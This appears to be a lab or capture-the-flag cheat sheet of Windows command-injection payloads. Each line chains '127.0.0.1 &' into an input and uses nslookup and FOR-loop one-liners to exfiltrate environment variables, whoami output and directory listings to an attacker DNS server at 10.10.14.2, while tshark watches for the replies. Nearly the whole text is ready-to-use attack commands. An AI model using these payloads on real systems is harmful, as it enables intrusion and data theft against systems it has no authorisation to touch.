#Check DNS request status

# On command prompt 1 (run nslookup)
127.0.0.1 & nslookup a.a.a 10.10.14.2

#On command prompt 2 (run tshark)
tshark -i tun0 host 10.10.10.6 and udp port 53

# Read environment variables from the target system (Windows target only).
# "-querytype=A" is specified, to make the output more readable.
127.0.0.1 & nslookup -querytype=A %OS%.a.a 10.10.14.2

#The PATH variable may reveal whether any interesting programs has been installed.
127.0.0.1 & nslookup -querytype=A "%PATH:~0,20%".a.a 10.10.14.2
127.0.0.1 & nslookup -querytype=A "%PATH:~20,20%".a.a 10.10.14.2

#Command Execution 
#Using FOR loop one-liners to achieve rudimentary command execution
127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('whoami') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"
127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"

#Examine program files to check for installed software
127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\Progra~2') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"
127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\Progra~2\OpenSSL-v1.1.0') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"
127.0.0.1 & cmd.exe /V /C "for /f "delims=" %e in ('DIR /B C:\Progra~2\OpenSSL-v1.1.0\bin') do cmd /c nslookup -querytype=A %e.a.a 10.10.14.2"

